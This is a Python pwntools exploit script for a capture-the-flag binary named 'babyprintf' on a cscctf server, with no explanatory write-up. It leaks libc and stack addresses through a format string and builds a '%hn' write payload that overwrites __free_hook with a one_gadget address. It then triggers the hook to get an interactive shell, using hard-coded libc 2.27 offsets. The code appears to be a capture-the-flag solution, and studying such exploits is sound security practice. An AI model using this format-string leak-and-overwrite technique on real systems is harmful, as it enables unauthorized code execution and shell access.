
from pwn import *
from sys import *
from libnum import *
from pprint import pprint as pp

context.arch = "amd64"
binary = "./babyprintf"
libcpath = '/lib/x86_64-linux-gnu/libc.so.6'
con = '''
nc babyprintf.problem.cscctf.com 10001
'''.strip().split(" ")

if(len(argv) == 2):
	p 	 = connect(con[1], con[2])
	libcpath = './libc-2.27.so'
else:
	p 	 = process(binary)

# p.interactive()
context.arch = "amd64"
cmd = """
b *{}
""".format(0x0000555555554000+0x00000000000008D8)
if(len(argv) == 3):
	gdb.attach(p, cmd)
e 	 = ELF(binary, checksec=False)
libc = ELF(libcpath, checksec=False)		


# create manually overwrite anywhere formatstring


def get_one_gadgets(libc):
	args = ["one_gadget", "-r"]
	if len(libc) == 40 and all(x in string.hexdigits for x in libc.hex()):
		args += ["-b", libc.hex()]
	else:
		args += [libc]
	return [int(offset) for offset in subprocess.check_output(args).decode('ascii').strip().split()]
x = get_one_gadgets(libcpath)[2]
# x = (get_one_gadgets(ELF('libc.so.6').buildid))
# x = (get_one_gadgets(ELF('challenge').libc.path))

# leak
# 43 libcstartmain
# 
# 66 AAAAAAAA0x7fffffffded0
# 0x7fffffffddb8
pload = "%43$p_%66$p"
p.sendline(pload)
hasil  = p.recvline().split("_")
libcmain  = eval(hasil[0])
rip  = eval(hasil[1]) + (0x7fffffffded0 - 0x7fffffffddb8)

offset___libc_start_main_ret = 0x21b97
offset_system = 0x000000000004f440
offset_dup2 = 0x00000000001109a0
offset_read = 0x0000000000110070
offset_write = 0x0000000000110140
offset_str_bin_sh = 0x1b3e9a
offset___malloc_hook = 0x00000000003ebc30
offset___free_hook = 0x00000000003ed8e8


base = libcmain - offset___libc_start_main_ret
magic = base + x

print "onegadget", hex(x)
print "rip", hex(rip)
print "libcmain", hex(libcmain)
print "onegadger", hex(magic)


malloc_hook = offset___malloc_hook + base
free_hook = offset___free_hook + base
print "malloc_hook", hex(malloc_hook)

one = magic  & 0xffff
two = (magic  & 0xffff0000) >> 2**4
three = (magic  & 0xffff00000000) >> 2**5
print hex(one), hex(two), hex(three)
# p.interactive()
pload = ""
print hex(magic)

def takeSecond(elem):
    return elem[1]
kotak = [(2, three), (1,two), (0, one)]
sortedList = sorted(kotak, key=takeSecond)
print sortedList
pload = ""
sudah = 0
print sortedList
for i in sortedList:
	pload += "%{}c".format(i[1] - sudah)
	pload += "%{}$hn".format(36+i[0])
	sudah = i[1]
	print sudah

print "free_hook", free_hook

pload += "Z" * (256 - len(pload) - 8*3 - 8)
pload += p64(free_hook)
pload += p64(free_hook+2)
pload += p64(free_hook+4)
pload += "XXx"
print pload, len(pload)
# p.interactive()
p.sendline(pload)
p.sendline("%100000c")
p.interactive()


# onegadget 0x10a38c
# rip 0x7fffffffdfe8
# libcmain 0x7ffff7a05b97
# onegadger 0x7ffff7aee38c
# malloc_hook 0x7ffff7dcfc30
# 0xe38c 0xf7ae 0x7fff
# 0x7ffff7aee38c
